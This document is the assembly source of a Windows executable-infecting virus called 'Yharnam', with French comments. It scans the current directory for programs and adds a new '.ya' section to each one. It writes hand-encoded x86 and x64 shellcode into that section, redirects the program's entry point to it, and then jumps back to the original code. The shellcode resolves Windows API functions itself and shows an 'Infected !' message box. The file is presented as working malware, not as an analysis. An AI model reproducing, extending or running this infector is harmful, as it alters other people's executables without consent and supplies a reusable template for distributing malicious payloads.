    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case sensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include c:\masm32\include\windows.inc
include c:\masm32\include\user32.inc
include c:\masm32\include\kernel32.inc
include C:\masm32\include\masm32.inc
include C:\masm32\include\masm32rt.inc

; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\kernel32.lib
includelib C:\masm32\lib\masm32.lib

.data
	pathTargetL		db		"Path target",0
	listTargetL		db		"Targets list",0
	nbSectionsL		db		"Nb sections",0
	machineL		db		"Machine",0
	infoFailedL		db		"Get info failed !!", 0
	entryPointL		db		"EntryPoint",0
	lastSectionL	db		"Last Section",0
	jumpL			db		"Jump",0
	;
	; Addresse de l'exe mappé
	;
	mappedAddr		dd		0
	
	;
	;	- Header infos
	;
	fileHeaderAddr	dd		0
	machine86		db		0
	nbSections		dw		0
	sizeOptHeader	dw		0
	oldEntry		dd		0
	offsetEntry		dd		0
	
	;
	;	- Header Ptr
	;
	imgFileHeader	dd		0
	imgOptHeader	dd		0
	imgEntryPoint	dd		0
	sectionsHeader	dd		0
	
	code_test	byte 048h, 031h, 0C0h

	code64		byte 055h, 048h, 08Bh, 0ECh, 048h, 081h, 0C4h, 070h, 0FFh, 0FFh, 0FFh, 048h, 033h, 0C0h, 067h, 065h
				byte 048h, 08Bh, 040h, 060h, 048h, 08Bh, 040h, 018h, 048h, 08Bh, 040h, 020h, 048h, 08Bh, 000h, 048h
				byte 08Bh, 000h, 048h, 08Bh, 040h, 020h, 048h, 089h, 045h, 0F8h, 048h, 08Bh, 0D8h, 066h, 003h, 05Bh
				byte 03Ch, 08Bh, 09Bh, 088h, 000h, 000h, 000h, 048h, 003h, 05Dh, 0F8h, 048h, 089h, 05Dh, 0F0h, 048h
				Byte 033h, 0FFh, 08Bh, 07Bh, 014h, 048h, 089h, 07Dh, 0E8h, 048h, 033h, 0FFh, 08Bh, 07Bh, 018h, 048h
				byte 089h, 07Dh, 0E0h, 048h, 08Dh, 07Dh, 0C0h, 0C7h, 007h, 047h, 065h, 074h, 050h, 0C7h, 047h, 004h
				byte 072h, 06Fh, 063h, 041h, 0C7h, 047h, 008h, 064h, 064h, 072h, 065h, 0C7h, 047h, 00Ch, 073h, 073h
				byte 000h, 000h, 048h, 033h, 0C9h, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 020h, 048h, 003h, 075h, 0F8h
				byte 048h, 08Bh, 0F9h, 048h, 0C1h, 0E7h, 002h, 048h, 003h, 0F7h, 08Bh, 03Eh, 048h, 003h, 07Dh, 0F8h
				byte 048h, 08Dh, 075h, 0C0h, 051h, 048h, 0C7h, 0C1h, 00Eh, 000h, 000h, 000h, 0FCh, 0F3h, 0A6h, 059h
				byte 075h, 02Ah, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 024h, 048h, 003h, 075h, 0F8h, 048h, 033h, 0FFh
				byte 066h, 08Bh, 03Ch, 04Eh, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 01Ch, 048h, 003h, 075h, 0F8h, 08Bh
				byte 03Ch, 0BEh, 048h, 003h, 07Dh, 0F8h, 048h, 089h, 07Dh, 0D8h, 0EBh, 009h, 048h, 0FFh, 0C1h, 048h
				byte 03Bh, 04Dh, 0E0h, 075h, 0A0h, 048h, 08Dh, 07Dh, 0B0h, 0C7h, 007h, 04Ch, 06Fh, 061h, 064h, 0C7h
				byte 047h, 004h, 04Ch, 069h, 062h, 072h, 0C7h, 047h, 008h, 061h, 072h, 079h, 041h, 0C7h, 047h, 00Ch
				byte 000h, 000h, 000h, 000h, 048h, 08Bh, 04Dh, 0F8h, 048h, 08Dh, 055h, 0B0h, 048h, 08Bh, 07Dh, 0D8h
				byte 0FFh, 0D7h, 048h, 089h, 045h, 0D0h, 048h, 08Dh, 07Dh, 0A0h, 0C7h, 007h, 055h, 073h, 065h, 072h
				byte 0C7h, 047h, 004h, 033h, 032h, 02Eh, 064h, 0C7h, 047h, 008h, 06Ch, 06Ch, 000h, 000h, 048h, 08Dh
				byte 04Dh, 0A0h, 0FFh, 0D0h, 048h, 08Dh, 07Dh, 090h, 0C7h, 007h, 04Dh, 065h, 073h, 073h, 0C7h, 047h
				byte 004h, 061h, 067h, 065h, 042h, 0C7h, 047h, 008h, 06Fh, 078h, 041h, 000h, 048h, 08Bh, 0C8h, 048h
				byte 08Dh, 055h, 090h, 048h, 08Bh, 045h, 0D8h, 0FFh, 0D0h, 048h, 08Dh, 07Dh, 080h, 0C7h, 007h, 059h
				byte 068h, 061h, 072h, 0C7h, 047h, 004h, 06Eh, 061h, 06Dh, 000h, 048h, 08Dh, 0BDh, 070h, 0FFh, 0FFh
				byte 0FFh, 0C7h, 007h, 049h, 06Eh, 066h, 065h, 0C7h, 047h, 004h, 063h, 074h, 065h, 064h, 0C7h, 047h
				byte 008h, 020h, 021h, 000h, 000h, 048h, 0C7h, 0C1h, 000h, 000h, 000h, 000h, 048h, 08Dh, 095h, 070h
				byte 0FFh, 0FFh, 0FFh, 04Ch, 08Dh, 045h, 080h, 041h, 0B9h, 000h, 000h, 000h, 000h, 0FFh, 0D0h, 048h
				byte 081h, 0C4h, 090h, 000h, 000h, 000h, 05Dh

    code		byte 033h, 0c0h, 064h, 08bh, 040h, 030h, 054h, 08bh, 0ech, 083h, 0ech, 030h, 08bh, 040h, 00ch, 08bh
				byte 040h, 014h, 08bh, 000h, 08bh, 000h, 08bh, 040h, 010h, 089h, 045h, 000h, 08bh, 0d8h, 003h, 05bh
				byte 03ch, 08bh, 05bh, 078h, 003h, 05dh, 000h, 089h, 05dh, 004h, 068h, 073h, 073h, 000h, 000h, 068h
				byte 064h, 064h, 072h, 065h, 068h, 072h, 06fh, 063h, 041h, 068h, 047h, 065h, 074h, 050h, 089h, 065h
				byte 014h, 0bfh, 00eh, 000h, 000h, 000h, 089h, 07dh, 010h, 08bh, 07eh, 014h, 089h, 07dh, 008h, 08bh
				byte 07eh, 018h, 089h, 07dh, 00ch, 08bh, 076h, 020h, 003h, 075h, 000h, 033h, 0c9h, 0ebh, 047h, 08bh
				byte 075h, 004h, 08bh, 076h, 020h, 003h, 075h, 000h, 08bh, 0f9h, 0c1h, 0e7h, 002h, 003h, 0f7h, 08bh
				byte 03eh, 003h, 07dh, 000h, 056h, 08bh, 075h, 014h, 051h, 08bh, 04dh, 010h, 0fch, 0f3h, 0a6h, 059h
				byte 075h, 023h, 08bh, 075h, 004h, 08bh, 076h, 024h, 003h, 075h, 000h, 00fh, 0b7h, 03ch, 04eh, 08bh
				byte 075h, 004h, 08bh, 076h, 01ch, 003h, 075h, 000h, 08bh, 03ch, 0beh, 003h, 07dh, 000h, 08bh, 0c7h
				byte 089h, 07dh, 018h, 0ebh, 006h, 041h, 03bh, 04dh, 00ch, 072h, 0b4h, 06ah, 000h, 068h, 061h, 072h
				byte 079h, 041h, 068h, 04ch, 069h, 062h, 072h, 068h, 04ch, 06fh, 061h, 064h, 054h, 0ffh, 075h, 000h
				byte 0ffh, 0d0h, 089h, 045h, 01ch, 068h, 06ch, 06ch, 000h, 000h, 068h, 033h, 032h, 02eh, 064h, 068h
				byte 055h, 073h, 065h, 072h, 054h, 0ffh, 0d0h, 068h, 06fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h
				byte 042h, 068h, 04dh, 065h, 073h, 073h, 054h, 050h, 08bh, 05dh, 018h, 0ffh, 0d3h, 089h, 045h, 020h
				byte 068h, 06Fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 089h
				byte 065h, 018h, 089h, 065h, 01Ch, 06Ah, 000h, 08Bh, 055h, 018h, 052h, 08Bh, 055h, 01Ch, 052h, 06Ah
				byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
				byte 000h, 000h,

; Struct url
;


; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

CheckExe proc Path:PTR BYTE
	local FileInfo:SHFILEINFO
	
	; SI SHGFI_EXETYPE => eax type d'exe 
	invoke SHGetFileInfo, Path, FILE_ATTRIBUTE_NORMAL, ADDR FileInfo, SIZEOF FileInfo, SHGFI_EXETYPE
	; Si eax = 0. Le fichier n'est pas un exe
	; Sinon dans eax, le type d'exe
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
	ret
CheckExe endp

GetInfoPE proc

	; ---------------------------------------------------------
	;	File Header
	; ---------------------------------------------------------
	
	; Get File Header addr / Set imgFileHeader ptr
	mov esi, mappedAddr
	lea esi, [esi + 03Ch]
	mov edi, 0
	mov edi, [esi]
 	mov fileHeaderAddr, edi
 	add edi, 4h
 	add edi, mappedAddr
 	mov imgFileHeader, edi

 	; Check File Header addr
 	mov esi, mappedAddr
 	add esi, fileHeaderAddr
 	mov edi, [esi]
 	
 	cmp di, 4550h
 	jne InfoEndFailed
 	
 	; Check Machine
 	mov esi, imgFileHeader
 	lea edi, [esi].IMAGE_FILE_HEADER.Machine
 	mov di, [edi]
 	
 	cmp di, 0220h
 	je InfoEndFailed
 	;and edi, 0000FFFFh
 	
 	mov machine86, 0
 	cmp di, 014Ch
 	jne MachineSuccess
	mov machine86, 1
MachineSuccess:
	;mov cl, machine86
	;invoke MessageBox, 0, uhex$(ecx), ADDR machineL, MB_OK
	
	; Sections numbers
	;mov esi, imgFileHeader
	lea edi, [esi].IMAGE_FILE_HEADER.NumberOfSections
	mov di, [edi]
	mov nbSections, di
	
	;mov imgFileHeader, ebx
	;lea edx, [ebx].IMAGE_FILE_HEADER.NumberOfSections
	;mov , [edx]
	invoke MessageBox, 0, uhex$(edi), ADDR nbSectionsL, MB_OK
	
	; ---------------------------------------------------------
	;	Optional Header
	; ---------------------------------------------------------
	
	; Set optional header addr
	lea edi, [esi].IMAGE_FILE_HEADER.SizeOfOptionalHeader
	mov edi, [edi]
	mov sizeOptHeader, di
	
	
	mov edi, SIZEOF IMAGE_FILE_HEADER
	add esi, edi
	mov imgOptHeader, esi
	
	
	; Entry Point
	mov edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
	mov imgEntryPoint, edi
	
	;invoke MessageBox, 0, uhex$(edi), ADDR entryPointL, MB_OK
	
	jmp InfoEnd
InfoEndFailed:
	invoke MessageBox, 0, ADDR infoFailedL, ADDR infoFailedL, MB_OK
	mov eax, 0
InfoEnd:
	ret
GetInfoPE endp

GetLastSection proc
	local lastSection:DWORD
	
	mov esi, imgOptHeader
	add si, sizeOptHeader
	mov sectionsHeader, esi
	
	;invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
	mov ecx, 0
	mov cx, nbSections
BLastSection:
	test ecx, ecx
	jz BLastSectionEnd
	mov lastSection, esi
	add esi, SIZEOF IMAGE_SECTION_HEADER
	dec ecx
	jmp BLastSection
BLastSectionEnd:
	mov esi, lastSection
	invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
	mov eax, lastSection
	ret
GetLastSection endp

OverwriteEntryPoint proc uses esi edi New:DWORD
	mov esi, imgOptHeader
	lea edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
	mov esi, [edi]
	mov oldEntry, esi
	mov esi, New
	mov DWORD PTR [edi], esi
	;invoke MessageBox, 0, uhex$(esi), ADDR entryPointL, MB_OK
	;mov DWORD ptr [edi], esi
	ret
OverwriteEntryPoint endp

InjectSection proc lastSection:DWORD
	local endAddr:DWORD
	local virtualEnd:DWORD
	local targetSection:DWORD
	
	; Derniere section dans le header sections
	mov esi, lastSection
	
	; Set un pointeur sur la section suivante (la notre)
	mov edi, lastSection
;	cmp machine86, 1
;	je InjectSEnd
;	add edi, 10h
;InjectSEnd:
	add edi, SIZEOF IMAGE_SECTION_HEADER
	
	mov edx, imgOptHeader
	lea ebx, [edx].IMAGE_OPTIONAL_HEADER.SizeOfImage
	mov edx, [ebx]
	add edx, 1000h
	;invoke MessageBox, 0, uhex$(edx), ADDR entryPointL, MB_OK
	mov [ebx], edx
	
	; Calcul de l'adresse de notre section
	mov edx, [esi].IMAGE_SECTION_HEADER.PointerToRawData
	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
	add edx, ebx
	mov endAddr, edx
	mov targetSection, edx
	
	mov edx, [esi].IMAGE_SECTION_HEADER.VirtualAddress
	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
	add edx, ebx
	mov ebx, edx
	and ebx, 000000FFFh
	cmp ebx, 0
	je PAGEALIGN
	and edx, 0FFFFF000h
	add edx, 1000h
PAGEALIGN:
	mov virtualEnd, edx
	
	; Overwrite entry point
	invoke OverwriteEntryPoint, edx
	
	; Set name
	mov DWORD ptr [edi], 0061792eh ; ".ya"
	
	; Add +1 section number;
	mov edx, imgFileHeader
	mov cx, [edx].IMAGE_FILE_HEADER.NumberOfSections
	lea ebx, [edx].IMAGE_FILE_HEADER.NumberOfSections
	inc cx
	mov WORD ptr [ebx], cx

	; Set VirtualSize
	lea edx, [edi].IMAGE_SECTION_HEADER.VirtualAddress
	sub edx, SIZEOF DWORD
	mov DWORD PTR [edx], 00001000h
	
	; Set notre VirtuaAddress
	lea edx, [edi].IMAGE_SECTION_HEADER.VirtualAddress
	mov ebx, virtualEnd
	mov [edx], ebx
	
	; Set la taille de RawData
	lea edx, [edi].IMAGE_SECTION_HEADER.SizeOfRawData
	mov DWORD ptr [edx], 00001000h
	
	; Set Pointer to raw data
	lea edx, [edi].IMAGE_SECTION_HEADER.PointerToRawData
	mov ebx, endAddr
	
	mov [edx], ebx
	
	; Set characteristics
	lea edx, [edi].IMAGE_SECTION_HEADER.Characteristics
	mov DWORD ptr [edx], 60000020h
	
	;ret 
	; Test move to section.
	mov edx, virtualEnd
	;add edx, 113h
	add edx, 4h
	mov ebx, oldEntry
	sub edx, ebx
	mov ebx, 0FFFFFFFFh
	sub ebx, edx
	mov offsetEntry, ebx
	
	;invoke MessageBox, 0, uhex$(virtualEnd), ADDR jumpL, MB_OK
	
	mov edx, targetSection
	mov ebx, mappedAddr
	add edx, ebx
	

	cmp machine86, 0
	je Inject64

	invoke MemCopy, ADDR code, edx, 113h
	add edx, 113h
	sub offsetEntry, 113h
	jmp InjectJump

Inject64:
	;invoke MemCopy, ADDR code_test, edx, 3h
	;add edx, 3h
	
	invoke MemCopy, ADDR code64, edx, 197h
	add edx, 197h
	sub offsetEntry, 197h
	
InjectJump:
	mov BYTE PTR [edx], 0E9h
	inc edx
	mov ebx, offsetEntry
	mov DWORD PTR [edx], ebx
InjectSectionEnd:
	ret
InjectSection endp

MapExe proc path:DWORD
	local buff:OFSTRUCT
	
	local hfile:HANDLE
	local nSize:DWORD
	local fileSizeHigh:DWORD
	
	local hfileMap:HANDLE
	
	; Ouvre l'exe
	invoke OpenFile, path, ADDR buff, 2h
 	mov hfile, eax
 	cmp eax, -1
 	je MapExeEnd
	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
	
	invoke GetFileSize, hfile, ADDR fileSizeHigh
	mov nSize, eax
	
	; Ajoute plus d'espace (une page) pour le code malicieux
	add nSize, 1000h
	
	invoke CreateFileMapping, hfile, 0, PAGE_READWRITE, 0, nSize, 0
	mov hfileMap, eax
	cmp eax, 0
	je MapExeEnd
	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
	
	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
	mov DWORD PTR mappedAddr, eax
	test eax, eax
	jz MapExeEnd
	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK

	;
	;
	;  L'executable est mappé en memoire.
	;
	;
	
	; set entryPoint
	; set nbSections
	invoke GetInfoPE
	
	;
	; Ajout d'une section dans l'executable.
	;
	;	- Rajouter une IMAGE_SECTION_HEADER à la fin du header de sections
	;				
	;       - Name[IMAGE_SIZEOF_SHORT_NAME] => Nom de la section
	;		- DWORD |PhysicalAdresse + VirutSize
	;		- DWORD VirtualAddress => Address premier byte de la section
	;		-
	invoke GetLastSection
	invoke InjectSection, eax
	
	 
	;invoke OverwriteEntryPoint, 00414243h
	;invoke DisplayEntryPoint
	;invoke SectionTable
MapExeEnd:
	ret
MapExe endp

ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
	local fileTarget[512]:byte

	invoke StrLen, Directory
	invoke MemCopy, Directory, ADDR fileTarget, eax
	
	invoke StrLen, Directory
	lea edi, fileTarget
	add edi, eax
	invoke StrLen, File
	mov edx, edi
	add edx, eax
	mov BYTE PTR [edx], 0
	invoke MemCopy, File, edi, eax
	
	invoke CheckExe, ADDR fileTarget
	test eax, eax
	jz ProcessFileEnd
	
	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
 	invoke MapExe, ADDR fileTarget
 	;
 	; Mapping de l'exe
 	;
 	
ProcessFileEnd:
	ret
ProcessFile endp

;
;
;
align 4

Yharnam proc uses esi edi Directory:PTR BYTE
	local hfile:HANDLE
	local ffd:WIN32_FIND_DATA
	local directoryFilter[128]:byte
	
	; Rajoute "*" pour le filtre
	invoke StrLen, Directory
	lea edi, directoryFilter
	add edi, eax
	mov WORD PTR [edi], 002Ah
	
	invoke MemCopy, Directory, ADDR directoryFilter, eax
	
	;Sinvoke MessageBox, 0, ADDR directoryFilter, ADDR listTargetL, MB_OK
	
	invoke FindFirstFile, ADDR directoryFilter, ADDR ffd
	mov hfile, eax

	;invoke MessageBox, 0, uhex$(eax), ADDR listTargetL, MB_OK
BDIR:
	cmp eax, 0
	je BDIREND
	cmp eax, ERROR_FILE_NOT_FOUND
	je BDIREND
	cmp eax, ERROR_NO_MORE_FILES
	je BDIREND
	
	;test eax, eax
 	;jz BDIREND
 	;mov eax, 0
 	
 	; Mes dans ebx l'addresse de ffd
	lea esi, ffd
	; Mes dans edx l'addresse de cFileName
	lea esi, [esi].WIN32_FIND_DATA.cFileName

	; Affiche le nom du fichiers présent (ADDR du buffer dans edx)
	;invoke MessageBox, 0, esi, ADDR listTargetL, MB_OK
	;invoke MessageBox, 0, Directory, ADDR listTargetL, MB_OK
	
	invoke ProcessFile, Directory, esi
	; Le retour de FindNextFile est save dans eax
	invoke FindNextFile, hfile, ADDR ffd
	jmp BDIR
BDIREND:
	ret
Yharnam endp


; ---------------------------------------------------------
;	
; ---------------------------------------------------------
WinMain proc
	; Destination pour le path
	local buff[128]:byte

	; WIN API
	invoke GetCurrentDirectory, 124, ADDR buff
	
 	; Addr "\" to buff
 	invoke StrLen, ADDR buff
	lea edi, buff
	add edi, eax
	mov WORD PTR [edi], 005Ch
	
	; Affiche le buffer et la taille avant rajout de "\*"
	;invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
	
	invoke Yharnam, ADDR buff
	ret
WinMain endp

start:
	invoke WinMain
    ;invoke ExitProcess, 0
end start
